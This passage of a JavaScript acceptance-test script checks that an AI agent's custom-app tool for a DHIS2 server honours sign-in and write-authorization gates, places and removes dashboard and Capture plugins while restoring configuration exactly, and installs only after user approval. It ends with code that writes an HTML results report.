        lo = await ctx.executeTool('manage_custom_app', { action: 'create', name: 'AI test logged out', key: 'ai-test-loggedout', kind: 'app', datastore_namespace: false, files: { 'app.jsx': good } });
        const prep = await ctx.prepareCustomAppBuild(Object.assign(ctx.customAppSpecFromArgs({ name: 'lo', kind: 'app', datastore_namespace: false }, 'ai-test-loggedout', null), { sources: { 'app.jsx': good } }));
        const up = await ctx.uploadAppZip(prep.pkg.zip, 'ai-test-loggedout.zip');
        check('logged out: the upload itself reports "Not signed in" with a hint', up._not_signed_in === true && !!up._hint, up._error);
      } finally {
        setAuth(USERPASS);
      }
      check('logged out: create fails cleanly with a sign-in error', !!lo._error && /sign|401/i.test(lo._error), lo._error);
      note(`logged-out expected failed calls: ${summarize(mark).failed.map((f) => `${f.status} ${f.method} ${f.url}`).join(' | ')}`);
      check('logged out: server unchanged', `${await appsSnapshot()}|${await namespacesSnapshot()}` === before3);
      // read_only turn: the write gate refuses.
      const dd = ctx.__getDhis2();
      const saved = dd.writeAuth;
      dd.writeAuth = { scope: 'read_only', reason: 'scenario: no authorization in this turn' };
      try {
        const g = await tool({ action: 'create', name: 'AI test gated', key: 'ai-test-gated', kind: 'app', datastore_namespace: false, files: { 'app.jsx': good } });
        check('write auth read_only: create refused by requireWriteAuth', g.r._scope === 'requires_user_confirmation', g.r._error);
        check('write auth read_only: preview still works (discovery)', (await tool({ action: 'preview', name: 'AI test gated', key: 'ai-test-gated', kind: 'app', files: { 'app.jsx': good } })).r.preview === true);
        check('write auth read_only: nothing installed', !(await appsSnapshot()).includes('ai-test-gated@'));
      } finally {
        dd.writeAuth = saved;
      }
    }

    // ── 10–13. Placement (manage_custom_app place / unplace / placements) ──
    // Writes the Capture app's own configuration exactly like the Tracker
    // Plugin Configurator; every key must end byte-identical (jsonb-equal) to
    // where it started, and no patient data is ever saved.
    const canon = (v) => Array.isArray(v) ? `[${v.map(canon).join(',')}]` : (v && typeof v === 'object') ? `{${Object.keys(v).sort().map((k) => `${JSON.stringify(k)}:${canon(v[k])}`).join(',')}}` : JSON.stringify(v === undefined ? null : v);
    const captureKey = async (k) => {
      const keys = ((await api('GET', 'dataStore')).json || []).includes('capture') ? ((await api('GET', 'dataStore/capture')).json || []) : [];
      return keys.includes(k) ? (await api('GET', `dataStore/capture/${k}`)).json : null;
    };
    // What the user said this turn: place only goes ahead when a placement
    // was asked for, exactly as in a real chat.
    const userSays = (text) => require('vm').runInContext(`lastUserText = ${JSON.stringify(text)};`, ctx);
    const waitFrame = async (page, key, timeout = 60000) => {
      const t0 = Date.now();
      while (Date.now() - t0 < timeout) {
        const f = page.frames().find((fr) => fr.url().includes(`/api/apps/${key}/plugin.html`));
        if (f) return f;
        await page.waitForTimeout(500);
      }
      return null;
    };
    if (want(10)) {
      scenario(10, 'Place a dashboard plugin with the tool — new dashboard, renders, placements, unplace');
      const apps = await appsSnapshot();
      if (!apps.includes('ai-test-kpi@')) await previewAndCreate({ name: 'AI test KPI tiles', key: 'ai-test-kpi', kind: 'plugin', plugin_type: 'DASHBOARD', datastore_namespace: false, files: { 'plugin.jsx': read('kpi.plugin.jsx') } });
      userSays('Build it and put it on a new dashboard called ai-test-placed');
      const pl = await tool({ action: 'place', key: 'ai-test-kpi', target: 'dashboard', dashboard_name: 'ai-test-placed', width: 30, height: 20 });
      check('place target "dashboard" creates the dashboard with the plugin item', pl.r.success === true && pl.r.dashboard && pl.r.dashboard.dashboard_id, pl.r._error || JSON.stringify(pl.r.dashboard));
      check('place made zero failed API calls', pl.failed.length === 0, pl.failed.map((f) => `${f.status} ${f.method} ${f.url}`).join(' | '));
      const dashId = pl.r.dashboard && pl.r.dashboard.dashboard_id;
      if (dashId) {
        dashboards.placed = dashId;
        const item = (await api('GET', `dashboards/${dashId}?${qs({ fields: 'dashboardItems[type,appKey,width,height]' })}`)).json.dashboardItems;
        check('the item is { type: APP, appKey } at the requested size', item.length === 1 && item[0].type === 'APP' && item[0].appKey === 'ai-test-kpi' && item[0].width === 30, JSON.stringify(item));
        const context = await newContext(browser, DESKTOP);
        const page = await context.newPage();
        const log = collect(page, 'ai-test-kpi');
        await openDashboard(page, dashId);
        const f = await appFrame(page, 'ai-test-kpi', 'plugin.html');
        await settled(f);
        check('the placed plugin renders on the dashboard', /Water quality KPIs/.test(await f.evaluate(() => document.body.innerText)));
        await shot(page, 'placed by the tool on a new dashboard', { group: 'placement' });
        assertLogs(log, 'placed dashboard plugin');
        await context.close();
        const where = await tool({ action: 'placements', key: 'ai-test-kpi' });
        check('placements lists the dashboard', (where.r.dashboards || []).some((d) => d.dashboard_id === dashId), JSON.stringify(where.r.dashboards));
        const again = await tool({ action: 'place', key: 'ai-test-kpi', target: 'dashboard', dashboard_id: dashId });
        check('placing on an existing dashboard appends (add_items keeps what is there)', again.r.success === true && again.r.dashboard.items_after === 2, again.r._error || JSON.stringify(again.r.dashboard));
        const un = await tool({ action: 'unplace', key: 'ai-test-kpi', target: 'dashboard', dashboard_id: dashId });
        const left = (await api('GET', `dashboards/${dashId}?${qs({ fields: 'dashboardItems[id]' })}`)).json.dashboardItems || [];
        check('unplace removes both items (dashboard backed up first)', un.r.success === true && un.r.removed.length === 2 && left.length === 0, un.r._error || JSON.stringify(un.r.removed));
        check('placements / unplace made zero failed API calls', where.failed.length + again.failed.length + un.failed.length === 0);
      }
    }

    const capBefore = { layout: await captureKey('enrollmentOverviewLayout'), forms: await captureKey('dataEntryForms'), editLayout: await captureKey('enrollmentEventEditLayout') };
    if (want(11)) {
      scenario(11, 'Capture enrollment widget — placed with the tool, shown in the real Capture app, unplaced exactly');
      const pc = await previewAndCreate({ name: 'AI test medication widget', key: 'ai-test-meds', kind: 'plugin', plugin_type: 'CAPTURE', datastore_namespace: false, files: { 'plugin.jsx': read('meds.capture.plugin.jsx') } });
      check('install the Capture widget (preview → create)', pc.cr.r.success === true, pc.cr.r._error || pc.pv.r._error);
      userSays('Add the medication widget to the Pharmacy enrollment dashboard');
      const pl = await tool({ action: 'place', key: 'ai-test-meds', target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ', column: 'right', position: 'top' });
      const lay = (await captureKey('enrollmentOverviewLayout')) || {};
      check('place: the Pharmacy program gets Capture\'s default layout + the plugin at the top of the right column', pl.r.success === true && pl.r.started_from_capture_default === true
        && lay.vj5cpA2OOfZ && /\/api\/apps\/ai-test-meds\/plugin\.html$/.test(lay.vj5cpA2OOfZ.rightColumn[0].source) && lay.vj5cpA2OOfZ.rightColumn[1].name === 'QuickActions', pl.r._error || JSON.stringify(lay.vj5cpA2OOfZ));
      check('every other program\'s layout is untouched', Object.keys(capBefore.layout || {}).every((k) => canon(lay[k]) === canon(capBefore.layout[k])));
      check('the previous layout was backed up first', pl.r.backup && /-capture-enrollmentOverviewLayout-/.test(pl.r.backup.key), JSON.stringify(pl.r.backup));
      check('place made zero failed API calls', pl.failed.length === 0, pl.failed.map((f) => `${f.status} ${f.method} ${f.url}`).join(' | '));
      // Ground truth: every drug ordered in that stage for the enrollment.
      const ev = (await api('GET', `tracker/events?${qs({ enrollments: 'ixCnD4spKWF', programStage: 'pHbLWI4CaxD', fields: 'event,dataValues[dataElement,value]', pageSize: 100 })}`)).json;
      const st = (await api('GET', `programStages/pHbLWI4CaxD?${qs({ fields: 'programStageDataElements[dataElement[id,optionSet[id]]]' })}`)).json;
      const osOf = Object.fromEntries(st.programStageDataElements.filter((p) => p.dataElement.optionSet).map((p) => [p.dataElement.id, p.dataElement.optionSet.id]));
      const expected = new Set();
      for (const e of ev.events || []) for (const dv of e.dataValues || []) if (osOf[dv.dataElement] && dv.value) {
        const o = (await api('GET', `optionSets/${osOf[dv.dataElement]}?${qs({ fields: 'options[code,displayName]' })}`)).json.options.find((x) => x.code === dv.value);
        expected.add(o ? o.displayName : dv.value);
      }
      for (const [vp, label] of [[DESKTOP, 'desktop'], [{ width: 1024, height: 900 }, '1024 px']]) {
        const context = await newContext(browser, vp);
        const page = await context.newPage();
        const log = collect(page, 'ai-test-meds');
        await page.goto(`${BASE}/dhis-web-capture/index.html#/enrollment?enrollmentId=ixCnD4spKWF&orgUnitId=d3V3O1ooYoL&programId=vj5cpA2OOfZ&teiId=dxtupxQ3Ohb`);
        const f = await waitFrame(page, 'ai-test-meds');
        check(`${label}: the widget is on the real Capture enrollment dashboard`, !!f);
        if (f) {
          await settled(f, 45000);
          const text = await f.evaluate(() => document.body.innerText);
          const missing = [...expected].filter((n) => !text.includes(n));
          check(`${label}: it lists every drug ordered for this enrollment, by name (${expected.size})`, expected.size > 0 && !missing.length, missing.join(' | '));
          const el = await f.frameElement();
          await el.scrollIntoViewIfNeeded();
          const box = await el.boundingBox();
          const docH = await f.evaluate(() => document.documentElement.scrollHeight);
          check(`${label}: Capture sized the frame to the widget (nothing cut off)`, box.height + 2 >= docH && box.height > 120, `frame ${Math.round(box.height)} px, content ${docH} px`);
          await shot(el, `Capture widget (${label})`, { group: 'placement' });
          await shot(page, `Capture enrollment dashboard with the widget (${label})`, { group: 'placement' });
          assertLogs(log, `Capture widget ${label}`);
        }
        await context.close();
      }
      const un = await tool({ action: 'unplace', key: 'ai-test-meds', target: 'enrollment_dashboard' });
      check('unplace removes the Pharmacy entry it created', un.r.success === true && un.r.removed.length === 1 && un.r.removed[0].entry_removed === true, un.r._error || JSON.stringify(un.r.removed));
      check('enrollmentOverviewLayout is exactly as it was before the scenario', canon(await captureKey('enrollmentOverviewLayout')) === canon(capBefore.layout));
      const context = await newContext(browser, DESKTOP);
      const page = await context.newPage();
      await page.goto(`${BASE}/dhis-web-capture/index.html#/enrollment?enrollmentId=ixCnD4spKWF&orgUnitId=d3V3O1ooYoL&programId=vj5cpA2OOfZ&teiId=dxtupxQ3Ohb`);
      await page.waitForTimeout(15000);
      check('after unplace the Capture page is back to its default (no widget)', !(await waitFrame(page, 'ai-test-meds', 3000)));
      await context.close();
    }

    if (want(12)) {
      scenario(12, 'Capture form-field plugin — field map, values in, setFieldValue out, in a real Capture event form (nothing saved)');
      const STAGE = 'pP1KQ0hZmYZ';
      const DE = { weight: 'eoCnd8XuOIr', height: 'DDbjsIbe1Oj', temperature: 'KA5fbw0sUQv', summary: 'D5sV8dFzRfJ' };
      const eventsBefore = ((await api('GET', `tracker/events?${qs({ enrollments: 'AAHn18XlSn4', programStage: STAGE, fields: 'event', pageSize: 100 })}`)).json.events || []).length;
      const pc = await previewAndCreate({ name: 'AI test vitals check', key: 'ai-test-vitals', kind: 'plugin', plugin_type: 'CAPTURE', datastore_namespace: false, files: { 'plugin.jsx': read('vitals.capture-field.plugin.jsx') } });
      check('install the form-field plugin (preview → create), no lint warnings', pc.cr.r.success === true && !(pc.pv.r.warnings || []).length, pc.cr.r._error || JSON.stringify(pc.pv.r.warnings));
      userSays('Add the vitals check plugin to the Initial Assessment form');
      const bad = await tool({ action: 'place', key: 'ai-test-vitals', target: 'form', program_stage_id: STAGE, field_map: [{ plugin_field: 'weight', field_id: DE.weight }, { plugin_field: 'height', field_id: DE.height }] });
      check('a field map missing an alias the plugin writes is refused, nothing written', /writes "summary"/.test(bad.r._error || '') && canon(await captureKey('dataEntryForms')) === canon(capBefore.forms), bad.r._error);
      const pl = await tool({ action: 'place', key: 'ai-test-vitals', target: 'form', program_stage_id: STAGE, section: 'Section A: Initial Assessment (Nurse)', position: 'bottom', field_map: Object.entries(DE).map(([plugin_field, field_id]) => ({ plugin_field, field_id })) });
      const form = ((await captureKey('dataEntryForms')) || {})[STAGE] || [];
      const plug = form.flatMap((sec) => sec.elements).find((e) => e.type === 'plugin');
      check('place: the stage form is written section by section with the plugin + its 4-field map (Configurator format)', pl.r.success === true && form.length === 3 && plug && plug.fieldMap.length === 4
        && plug.fieldMap.every((f) => f.objectType === 'TrackedEntityAttribute') && form[0].elements[form[0].elements.length - 1] === plug, pl.r._error || JSON.stringify(form.map((sec) => sec.elements.length)));
      check('place made zero failed API calls', pl.failed.length + bad.failed.length === 0, [...pl.failed, ...bad.failed].map((f) => `${f.status} ${f.method} ${f.url}`).join(' | '));
      const context = await newContext(browser, { width: 1440, height: 1100 });
      const page = await context.newPage();
      const log = collect(page, 'ai-test-vitals');
      await page.goto(`${BASE}/dhis-web-capture/index.html#/enrollmentEventNew?enrollmentId=AAHn18XlSn4&orgUnitId=d3V3O1ooYoL&programId=nqT1hqxxjvz&stageId=${STAGE}&teiId=jrHAwYS65H5`);
      const f = await waitFrame(page, 'ai-test-vitals');
      check('the plugin is inside the real Capture "Initial Assessment" form', !!f);
      if (f) {
        const capture = f.parentFrame();
        const field = (id) => capture.locator(`[data-test="form-field-${id}"]`).locator('input, textarea').first();
        await settled(f, 45000);
        check('before any input it asks for the values', /Enter weight, height and temperature/.test(await f.evaluate(() => document.body.innerText)));
        for (const [id, v] of [[DE.weight, '70'], [DE.height, '175'], [DE.temperature, '38.4']]) { await field(id).fill(v); await field(id).press('Tab'); }
        await page.waitForTimeout(2500);
        const ptext = (await f.evaluate(() => document.body.innerText)).replace(/\s+/g, ' ');
        check('values flow into the plugin (weight, height, temperature)', /BMI 22\.9 · normal weight/.test(ptext) && /Fever 38\.4 °C/.test(ptext), ptext);
        check('setFieldValue wrote the summary into the mapped field', (await field(DE.summary).inputValue()) === 'Vitals: BMI 22.9 (normal weight), fever 38.4 °C', await field(DE.summary).inputValue());
        await field(DE.temperature).fill('36.6');
        await field(DE.temperature).press('Tab');
        await page.waitForTimeout(2500);
        check('changing a mapped value updates the plugin and the written field', (await field(DE.summary).inputValue()) === 'Vitals: BMI 22.9 (normal weight), no fever (36.6 °C)', await field(DE.summary).inputValue());
        const el = await f.frameElement();
        await el.scrollIntoViewIfNeeded();
        const box = await el.boundingBox();
        const docH = await f.evaluate(() => document.documentElement.scrollHeight);
        check('Capture sized the plugin to its content', box.height + 2 >= docH && box.height < 160, `frame ${Math.round(box.height)} px, content ${docH} px`);
        await shot(page, 'form-field plugin in the Capture event form', { group: 'placement' });
        assertLogs(log, 'form-field plugin');
      }
      await context.close(); // leave without saving
      const un = await tool({ action: 'unplace', key: 'ai-test-vitals' });
      check('unplace removes the form entry it created', un.r.success === true && un.r.removed.length === 1 && un.r.removed[0].entry_removed === true, un.r._error || JSON.stringify(un.r.removed));
      check('dataEntryForms is exactly as it was before the scenario', canon(await captureKey('dataEntryForms')) === canon(capBefore.forms));
      check('no event was saved (data untouched)', ((await api('GET', `tracker/events?${qs({ enrollments: 'AAHn18XlSn4', programStage: STAGE, fields: 'event', pageSize: 100 })}`)).json.events || []).length === eventsBefore);
    }

    if (want(13)) {
      scenario(13, 'Deleting a placed plugin takes it off every page first');
      if (!(await appsSnapshot()).includes('ai-test-meds@')) await previewAndCreate({ name: 'AI test medication widget', key: 'ai-test-meds', kind: 'plugin', plugin_type: 'CAPTURE', datastore_namespace: false, files: { 'plugin.jsx': read('meds.capture.plugin.jsx') } });
      userSays('Put the widget on the Pharmacy enrollment dashboard and on the edit-event page');
      const a = await tool({ action: 'place', key: 'ai-test-meds', target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' });
      const b = await tool({ action: 'place', key: 'ai-test-meds', target: 'enrollment_event_edit', program_id: 'vj5cpA2OOfZ', column: 'left', position: 'bottom' });
      const editBefore = capBefore.editLayout;
      check('placed on the enrollment dashboard and the edit-event page', a.r.success === true && b.r.success === true, a.r._error || b.r._error);
      const del = await tool({ action: 'delete', key: 'ai-test-meds', delete_app_data: true });
      check('delete reports the placements it removed', del.r.success === true && (del.r.placements_removed || []).length === 2, del.r._error || JSON.stringify(del.r.placements_removed));
      check('enrollmentOverviewLayout is back exactly as before', canon(await captureKey('enrollmentOverviewLayout')) === canon(capBefore.layout));
      check('enrollmentEventEditLayout is back exactly as before', canon(await captureKey('enrollmentEventEditLayout')) === canon(editBefore));
      check('the app is gone', !(await appsSnapshot()).includes('ai-test-meds@'));
      check('place + delete made zero failed API calls', a.failed.length + b.failed.length + del.failed.length === 0, [...a.failed, ...b.failed, ...del.failed].map((f) => `${f.status} ${f.method} ${f.url}`).join(' | '));
    }

    // ── 9. End-to-end through the LLM ─────────────────────────────────────
    if (want(9)) {
      scenario(9, 'End-to-end through the agent loop with a real LLM');
      if (!(process.env.LLM_BASE_URL && process.env.LLM_MODEL && process.env.LLM_API_KEY)) {
        cur.skipped = 'LLM_BASE_URL / LLM_MODEL / LLM_API_KEY are not set — scenario skipped (as specified).';
        console.log(`  – ${cur.skipped}`);
      } else {
        await runLlmScenario(browser);
      }
    }
  } catch (e) {
    if (!cur) scenario('X', 'Run');
    check(`run aborted: ${e.message}`, false, e.stack);
  } finally {
    await browser.close();
    R.toolApi = (() => { const s = summarize(); return { total: s.total, failed: s.failed.map((f) => `${f.status} ${f.method} ${f.url}`) }; })();
    R.cleanup = KEEP ? { skipped: '--keep: test artifacts left on the server' } : await cleanup('after');
    R.finished = new Date().toISOString();
    writeReport();
  }
  const failedChecks = R.scenarios.flatMap((s) => s.checks.filter((c) => !c.pass));
  console.log(`\n${failedChecks.length ? '\x1b[31mFAILED\x1b[0m' : '\x1b[32mALL CHECKS PASSED\x1b[0m'} — ${R.scenarios.reduce((n, s) => n + s.checks.length, 0)} checks, ${failedChecks.length} failed. Report: ${path.relative(process.cwd(), path.join(OUT, 'report.html'))}`);
  process.exit(failedChecks.length ? 1 : 0);
}

// Scenario 9: a natural-language request through runAgenticLoop with a real LLM.
async function runLlmScenario(browser) {
  // A fresh conversation every run: llm-harness persists chrome.storage.session
  // to a file so prompts can continue across processes, and this scenario used
  // to start inside the PREVIOUS run's thread — the model "remembered" the app
  // it built last time and skipped discovery.
  process.env.LLM_SESSION_FILE = path.join(OUT, 'llm-session.json');
  fs.rmSync(process.env.LLM_SESSION_FILE, { force: true });
  const { loadLLM, events } = require('./llm-harness');
  const { ctx: llm } = loadLLM({ appType: 'Dashboard' });
  await new Promise((r) => setTimeout(r, 50));
  const ask = async (text) => { const mark = events.length; await llm.runAgenticLoop(text, null, false, false); return events.slice(mark); };
  // Judge by the server, not by tool-card summaries: the manual gate's
  // "Loaded usage manual" is a success event too, and once passed for a real
  // install. The LLM picks its own key (not ai-test-), so remember it for cleanup.
  const aiApps = async () => ((await api('GET', 'apps')).json || []).map((a) => a.key).filter((k) => String(k).startsWith('ai-'));
  const before = await aiApps();
  const t1 = await ask('Build a dashboard widget that shows the number of enrollments per org unit for the selected period. Show me a preview first.');
  const new1 = (await aiApps()).filter((k) => !before.includes(k));
  llmCreatedKeys.push(...new1);
  const calls1 = t1.filter((e) => e.type === 'AI_TOOL_CALL');
  const used = calls1.map((c) => `${c.tool}(${(c.args && c.args.action) || ''})`);
  check('turn 1: discovery before building', calls1.some((c) => ['search_metadata', 'get_program_info', 'dhis2_query'].includes(c.tool)), used.join(', '));
  check('turn 1: previewed, and nothing installed before the user approved', calls1.some((c) => c.tool === 'manage_custom_app' && c.args && c.args.action === 'preview') && new1.length === 0, `${used.join(', ')}${new1.length ? ` — INSTALLED ${new1.join(', ')}` : ''}`);
  const t2 = await ask('yes, install it');
  const new2 = (await aiApps()).filter((k) => !before.includes(k) && !new1.includes(k));
  llmCreatedKeys.push(...new2);
  const used2 = t2.filter((e) => e.type === 'AI_TOOL_CALL').map((c) => `${c.tool}(${(c.args && c.args.action) || ''})`);
  check('turn 2: installed after "yes"', new2.length === 1, `${new2.join(', ') || 'nothing installed'} — ${used2.join(', ')}`);
  if (new2.length) {
    const placedOn = ((await api('GET', `dashboards?${qs({ filter: `dashboardItems.appKey:eq:${new2[0]}`, fields: 'id,displayName', paging: 'false' })}`)).json || {}).dashboards || [];
    check('nothing was placed or created that the user did not ask for', !placedOn.length, placedOn.map((x) => x.displayName).join(', '));
    for (const x of placedOn) await api('DELETE', `dashboards/${x.id}`);
  }
  note(`LLM tool calls: turn 1 ${used.join(', ')}; turn 2 ${used2.join(', ')}`);
  void browser;
}

// ── Report ──────────────────────────────────────────────────────────────────
function esc(s) { return String(s == null ? '' : s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c])); }
function writeReport() {
  fs.writeFileSync(path.join(OUT, 'results.json'), JSON.stringify(R, null, 2));
  const total = R.scenarios.reduce((n, s) => n + s.checks.length, 0);
  const failed = R.scenarios.reduce((n, s) => n + s.checks.filter((c) => !c.pass).length, 0);
  const facts = Object.entries(R.facts).map(([k, v]) => `<tr><th>${esc(k)}</th><td>${esc(typeof v === 'object' ? JSON.stringify(v) : v)}</td></tr>`).join('');
  const summary = R.scenarios.map((s) => {
    const f = s.checks.filter((c) => !c.pass).length;
    const status = s.skipped ? '<span class="skip">SKIPPED</span>' : f ? `<span class="fail">FAIL (${f})</span>` : '<span class="pass">PASS</span>';
    return `<tr><td>${esc(s.id)}</td><td><a href="#s-${esc(s.id)}">${esc(s.title)}</a></td><td>${s.checks.length}</td><td>${status}</td></tr>`;
  }).join('');
  const sections = R.scenarios.map((s) => {
    const rows = s.checks.map((c) => `<tr class="${c.pass ? 'ok' : 'bad'}"><td>${c.pass ? '✓' : '✗'}</td><td>${esc(c.name)}</td><td class="detail">${esc(c.detail)}</td></tr>`).join('');
    const groups = {};
    for (const sh of s.shots) (groups[sh.group] = groups[sh.group] || []).push(sh);
    const gallery = Object.entries(groups).map(([g, list]) => `<div class="group"><h4>${esc(g)}</h4><div class="shots">${list.map((sh) => `<figure><a href="${esc(sh.file)}" target="_blank"><img loading="lazy" src="${esc(sh.file)}" alt="${esc(sh.label)}"></a><figcaption>${esc(sh.label)}</figcaption></figure>`).join('')}</div></div>`).join('');
    const logs = s.logs.length ? `<details><summary>Logs (${s.logs.length})</summary><pre>${esc(s.logs.join('\n'))}</pre></details>` : '';
    return `<section id="s-${esc(s.id)}"><h2>${esc(s.id)}. ${esc(s.title)}</h2>${s.skipped ? `<p class="skip">${esc(s.skipped)}</p>` : ''}<table class="checks">${rows}</table>${gallery}${logs}</section>`;
  }).join('');
  const html = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Custom apps acceptance</title>
<style>
:root{--bg:#f4f6f8;--card:#fff;--ink:#212934;--muted:#4a5768;--ok:#1b5e20;--okbg:#e8f5e9;--bad:#b71c1c;--badbg:#ffebee;--line:#d5dde5;--skip:#6d4c00}
@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){--bg:#11161c;--card:#1a2129;--ink:#e6edf3;--muted:#9aa7b5;--ok:#7ddc8a;--okbg:#14301a;--bad:#ff8a80;--badbg:#3a1414;--line:#2c3642;--skip:#e0b84d}}
body{margin:0;background:var(--bg);color:var(--ink);font:14px/1.45 Roboto,"Segoe UI",Arial,sans-serif}
main{max-width:1280px;margin:0 auto;padding:16px}
h1{font-size:22px;margin:8px 0}h2{font-size:18px;margin:0 0 8px}h4{margin:12px 0 6px;color:var(--muted);text-transform:capitalize}
section,.card{background:var(--card);border:1px solid var(--line);border-radius:4px;padding:16px;margin:16px 0}
table{border-collapse:collapse;width:100%}th,td{text-align:left;padding:4px 8px;border-bottom:1px solid var(--line);vertical-align:top}
.checks td:first-child{width:20px;font-weight:700}.ok td:first-child{color:var(--ok)}.bad{background:var(--badbg)}.bad td:first-child{color:var(--bad)}
.detail{color:var(--muted);font-size:12px;word-break:break-word}
.pass{color:var(--ok);font-weight:600}.fail{color:var(--bad);font-weight:600}.skip{color:var(--skip);font-weight:600}
.shots{display:flex;flex-wrap:wrap;gap:12px}figure{margin:0;flex:1 1 300px;max-width:640px}figure img{width:100%;border:1px solid var(--line);border-radius:4px;background:#fff}
figcaption{font-size:12px;color:var(--muted)}pre{white-space:pre-wrap;font-size:12px}ul{margin:4px 0 0 18px;padding:0}
</style></head><body><main>
<h1>manage_custom_app — live &amp; visual acceptance</h1>
<p>${failed ? `<span class="fail">${failed} of ${total} checks failed</span>` : `<span class="pass">All ${total} checks passed</span>`} · ${esc(R.started)} → ${esc(R.finished)}</p>
<div class="card"><h2>Instance</h2><table>${facts}</table></div>
<div class="card"><h2>Scenarios</h2><table><tr><th>#</th><th>Scenario</th><th>Checks</th><th>Result</th></tr>${summary}</table>
<p>Tool API calls (all scenarios, incl. the deliberate negative-test failures): ${R.toolApi.total} total, ${R.toolApi.failed.length} failed${R.toolApi.failed.length ? `:</p><pre>${esc(R.toolApi.failed.join('\n'))}</pre>` : '.</p>'}</div>
<div class="card"><h2>Visual fixes made</h2><ul>${R.fixes.map((f) => `<li>${esc(f)}</li>`).join('')}</ul></div>
${sections}
<div class="card"><h2>Cleanup</h2><pre>${esc(JSON.stringify(R.cleanup, null, 2))}</pre></div>
</main></body></html>`;
  fs.writeFileSync(path.join(OUT, 'report.html'), html);
}

// A browser only logs an unhandled rejection; Node would kill the run before
// cleanup (a dropped LLM stream did that on 2026-10-22). Record it as a failed
// check instead and let the run finish and clean up.
process.on('unhandledRejection', (e) => {
  console.error('[unhandledRejection]', e);
  if (!cur) scenario('X', 'Run');
  check(`no unhandled promise rejection (${e && e.message || e})`, false, e && e.stack);
});

main().catch((e) => { console.error(e); process.exit(1); });
